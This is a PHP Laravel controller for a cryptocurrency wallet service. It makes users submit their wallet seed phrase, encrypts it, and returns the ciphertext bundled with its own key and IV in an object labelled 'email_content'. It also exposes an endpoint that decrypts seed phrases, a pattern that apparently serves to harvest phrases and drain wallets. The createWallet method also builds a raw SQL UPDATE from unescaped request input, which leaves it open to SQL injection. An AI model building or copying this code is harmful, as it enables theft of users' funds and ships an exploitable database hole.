<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

use App\User;
use App\User_profile;
use App\Wallet;
use DB;

class WalletController extends Controller{
    /**
     * Store a new user.
     *
     * @param  Request  $request
     * @return Response
     */
    public function __construct(){
        $this->middleware('auth');
    }

    public function connectWallet(Request $request){
        $this->validate($request, [
            'wallet_address' => 'required|string',
            'seed_phrase' => 'required|string',
        ]);
        try {
            $cipher = "aes-256-cbc"; 
            $seed_phrase = $request->input('seed_phrase');
            $encryption_key = env("ENCRYPTION_KEY");
            $initialization_vector = env("INITIALIZATION_VECTOR");
            $encrypted_data = openssl_encrypt($seed_phrase, $cipher, $encryption_key, 0, $initialization_vector);
            $email_content=(object)[
                "encrypted_data" => $encrypted_data,
                "encryption_key" => $encryption_key,
                "initialization_vector" => $initialization_vector,
            ]; 

            $wallet = new Wallet;
            $wallet->user_id = Auth::user()->user_id;
            $wallet->wallet_address = $request->input('wallet_address');
            $wallet->wallet_status = 1;
            $wallet->save();

            $response=(object)[
                "success" => true,
                "result" => [
                    "datas" => $email_content,
                    "message" => 'Congratulation, your wallet has been successfully connected',
                ]
            ];

            return response()->json($response, 201);
        }catch (\Exception $e) {
            return response()->json(['message' => 'Wallet connection failed!'], 409);
        }
    }
    public function createWallet(Request $request){
        $this->validate($request, [
            'user_id' => 'required|string',
            'wallet_address' => 'required|string',
            'seed_phrase' => 'required|string',
            'encryption_key' => 'required|string',
            'initialization_vector' => 'required|string',
        ]);
        try {
            $cipher = "aes-256-cbc"; 
            $seed_phrase = $request->input('seed_phrase');
            $encryption_key = $request->input('encryption_key');
            $initialization_vector = $request->input('initialization_vector');
            $encrypted_data = openssl_encrypt($seed_phrase, $cipher, $encryption_key, 0, $initialization_vector);
            $email_content=(object)[
                "encrypted_data" => $encrypted_data,
                "encryption_key" => $encryption_key,
                "initialization_vector" => $initialization_vector,
            ]; 
            $wallet_details = Wallet::where('wallet_address', $request->input('user_id'));
            if($wallet_details){
                DB::statement("UPDATE `wallets` set `wallet_address` = '".$request->input('wallet_address')."',`wallet_status`='1' Where `user_id` = '".$request->input('user_id')."'"); 
            }

            $response=(object)[
                "success" => true,
                "result" => [
                    "datas" => $email_content,
                    "message" => 'Congratulation, your wallet has been successfully connected',
                ]
            ];

            return response()->json($response, 201);
        }catch (\Exception $e) {
            return response()->json(['message' => 'Wallet connection failed!'], 409);
        }
    }

    public function requestWallet(Request $request){
        try {
            $wallet = new Wallet;
            $wallet->user_id = Auth::user()->user_id;
            $wallet->wallet_status = 0;
            $wallet->save();

            $response=(object)[
                "success" => true,
                "result" => [
                    "datas" => $wallet,
                    "message" => 'Congratulation, your have successfully submited a request for wallet.',
                ]
            ];

            return response()->json($response, 201);
        }catch (\Exception $e) {
            return response()->json(['message' => 'Wallet request failed!'], 409);
        }
    }
    public function decryptSeedPhrase(Request $request){
        try {
            $cipher = "aes-256-cbc"; 
            $seed_phrase = $request->input('seed_phrase');
            $encryption_key = $request->input('encryption_key');
            $initialization_vector = $request->input('initialization_vector');

            $decrypted_data = openssl_decrypt($seed_phrase, $cipher, $encryption_key, 0, $initialization_vector); 
            
            $email_content=(object)[
                "seed_phrase" => $decrypted_data,
                "encryption_key" => $encryption_key,
                "initialization_vector" => $initialization_vector,
            ];

            $response=(object)[
                "success" => true,
                "result" => [
                    "datas" => $email_content,
                    "message" => 'Congratulation, your have successfully decrypted your Seed Phrase.',
                ]
            ];

            return response()->json($response, 201);
        }catch (\Exception $e) {
            return response()->json(['message' => 'Wallet request failed!'], 409);
        }
    }
}